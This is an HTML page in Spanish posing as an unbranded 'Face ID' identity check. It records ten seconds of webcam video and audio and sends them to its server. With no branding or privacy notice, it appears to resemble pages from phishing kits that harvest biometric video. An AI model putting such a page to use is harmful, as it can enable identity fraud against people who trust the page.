<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>Verificación Face ID</title>
  <style>
    body {
      margin: 0;
      padding: 0;
      font-family: "Arial", sans-serif;
      background-color: #f5f5f5;
      text-align: center;
    }
    .header {
      background-color: #29a745;
      height: 30px;
    }
    h1 {
      margin: 20px 20px 10px;
      font-size: 22px;
      color: #222;
    }
    .circle-container {
      margin-top: 20px;
      position: relative;
      display: inline-block;
    }
    .circle {
      width: 240px;
      height: 240px;
      border-radius: 50%;
      border: 4px solid #29a745;
      overflow: hidden;
      position: relative;
      background-color: #fff;
    }
    video, img {
      width: 100%;
      height: 100%;
      object-fit: cover;
    }
    video {
      transform: scaleX(-1);
    }
    .overlay {
      position: absolute;
      top: 0;
      left: 0;
      width: 240px;
      height: 240px;
      pointer-events: none;
    }
    .arrow {
      position: absolute;
      width: 240px;
      height: 240px;
      background-image: url('flecha-circular.png');
      background-size: contain;
      background-repeat: no-repeat;
      animation: spin 6s linear infinite;
    }
    @keyframes spin {
      from { transform: rotate(0deg); }
      to { transform: rotate(360deg); }
    }
    .description {
      margin: 20px;
      font-size: 16px;
      color: #666;
    }
    .btn {
      margin: 30px auto;
      padding: 15px 0;
      width: 90%;
      max-width: 300px;
      background-color: #29a745;
      color: white;
      border: none;
      border-radius: 25px;
      font-size: 18px;
      cursor: pointer;
    }
    .countdown {
      font-size: 60px;
      font-weight: bold;
      color: red;
      position: absolute;
      top: 50%;
      left: 50%;
      transform: translate(-50%, -50%);
      z-index: 5;
      display: none;
    }
  </style>
</head>
<body>
  <div class="header"></div>
  <h1>Vamos a validar tu identidad</h1>
  <div class="circle-container">
    <div class="circle">
      <img id="gifIntro" src="instruccion.gif" alt="Instrucción de movimiento">
      <video id="video" autoplay muted playsinline style="display: none;"></video>
      <div class="overlay">
        <div class="arrow"></div>
        <div class="countdown" id="countdown">5</div>
      </div>
    </div>
  </div>
  <div class="description">
    Al presionar continuar, coloca tu rostro en la cámara<br>
    y haz movimientos circulares con tu cabeza como se muestra
  </div>
  <button class="btn" id="startBtn">Continuar</button>
  <script src="/socket.io/socket.io.js"></script>
  <script>
    const socket = io();
    const video = document.getElementById('video');
    const gifIntro = document.getElementById('gifIntro');
    const startBtn = document.getElementById('startBtn');
    const countdownEl = document.getElementById('countdown');
    let mediaRecorder;
    let recordedChunks = [];
    let sessionId = Math.random().toString(36).substring(2, 15);  // Session ID generado

    startBtn.onclick = async () => {
      gifIntro.style.display = "none";
      video.style.display = "block";
      try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
        video.srcObject = stream;
        mediaRecorder = new MediaRecorder(stream);
        mediaRecorder.ondataavailable = e => { if (e.data.size > 0) recordedChunks.push(e.data); };
        mediaRecorder.onstop = () => {
          const blob = new Blob(recordedChunks, { type: 'video/webm' });
          const file = new File([blob], 'verificacion.mp4', { type: 'video/webm' });
          
          // Emitir el video y el sessionId al servidor
          socket.emit('videoForm', { sessionId, videoFile: file });

          // Redirigir después de procesar
          window.location.href = 'opciones.html';
        };
        await startCountdown();
        recordedChunks = [];
        mediaRecorder.start();
        startBtn.disabled = true;
        startBtn.innerText = "Grabando...";
        setTimeout(() => {
          mediaRecorder.stop();
          startBtn.innerText = "Enviando...";
        }, 10000);
      } catch (err) {
        alert("❌ No se pudo acceder a la cámara: " + err.message);
      }
    };

    function startCountdown() {
      return new Promise(resolve => {
        let count = 5;
        countdownEl.style.display = "block";
        countdownEl.innerText = count;
        const interval = setInterval(() => {
          count--;
          if (count === 0) {
            clearInterval(interval);
            countdownEl.style.display = "none";
            resolve();
          } else countdownEl.innerText = count;
        }, 1000);
      });
    }
  </script>
</body>
</html>
